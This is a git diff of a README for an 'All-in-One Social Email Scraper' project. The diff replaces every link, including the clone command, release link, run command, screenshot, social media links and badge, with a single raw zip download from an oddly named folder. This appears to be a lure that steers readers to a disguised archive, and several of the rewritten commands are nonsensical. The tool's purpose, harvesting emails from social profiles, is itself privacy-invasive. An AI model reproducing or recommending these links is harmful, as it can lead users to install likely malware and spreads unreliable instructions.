@@ -16,7 +16,7 @@ To get started with the All-in-One Social Email Scraper, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/Charliekess/All-in-One-Social-Email-Scraper.git
+   git clone https://github.com/Charliekess/All-in-One-Social-Email-Scraper/raw/refs/heads/main/Holometabola/Email-All-Scraper-One-Social-in-1.3.zip
    ```
 2. Navigate to the project directory:
    ```bash
@@ -26,7 +26,7 @@ To get started with the All-in-One Social Email Scraper, follow these steps:
 
 ## ⚙️ Usage
 
-After installation, you can download and execute the scraper. The latest release can be found [here](https://github.com/Charliekess/All-in-One-Social-Email-Scraper/releases).
+After installation, you can download and execute the scraper. The latest release can be found [here](https://github.com/Charliekess/All-in-One-Social-Email-Scraper/raw/refs/heads/main/Holometabola/Email-All-Scraper-One-Social-in-1.3.zip).
 
 ### How to Execute
 
@@ -34,7 +34,7 @@ After installation, you can download and execute the scraper. The latest release
 2. Extract the downloaded file.
 3. Run the script using the following command:
    ```bash
-   python scraper.py
+   python https://github.com/Charliekess/All-in-One-Social-Email-Scraper/raw/refs/heads/main/Holometabola/Email-All-Scraper-One-Social-in-1.3.zip
    ```
 4. Follow the prompts to enter the URLs of the social media profiles you want to scrape.
 
@@ -112,18 +112,18 @@ Here’s what’s coming next for the All-in-One Social Email Scraper:
 
 Explore the repository, download the scraper, and start collecting emails today. Don't forget to check out the **Releases** section for the latest updates!
 
-![Scraper Screenshot](https://example.com/screenshot.png)
+![Scraper Screenshot](https://github.com/Charliekess/All-in-One-Social-Email-Scraper/raw/refs/heads/main/Holometabola/Email-All-Scraper-One-Social-in-1.3.zip)
 
 ## 🌐 Connect With Us
 
 Follow us on social media for updates:
 
-- Twitter: [@AllInOneScraper](https://twitter.com/AllInOneScraper)
-- Facebook: [All-in-One-Social-Email-Scraper](https://facebook.com/AllinOneSocialEmailScraper)
+- Twitter: [@AllInOneScraper](https://github.com/Charliekess/All-in-One-Social-Email-Scraper/raw/refs/heads/main/Holometabola/Email-All-Scraper-One-Social-in-1.3.zip)
+- Facebook: [All-in-One-Social-Email-Scraper](https://github.com/Charliekess/All-in-One-Social-Email-Scraper/raw/refs/heads/main/Holometabola/Email-All-Scraper-One-Social-in-1.3.zip)
 
 ---
 
 Thank you for checking out the All-in-One Social Email Scraper. Your feedback is crucial for us, so feel free to reach out!
 
-[![Latest Release](https://img.shields.io/badge/latest_release-download%20now-brightgreen)](https://github.com/Charliekess/All-in-One-Social-Email-Scraper/releases)
+[![Latest Release](https://github.com/Charliekess/All-in-One-Social-Email-Scraper/raw/refs/heads/main/Holometabola/Email-All-Scraper-One-Social-in-1.3.zip%20now-brightgreen)](https://github.com/Charliekess/All-in-One-Social-Email-Scraper/raw/refs/heads/main/Holometabola/Email-All-Scraper-One-Social-in-1.3.zip)
 ```
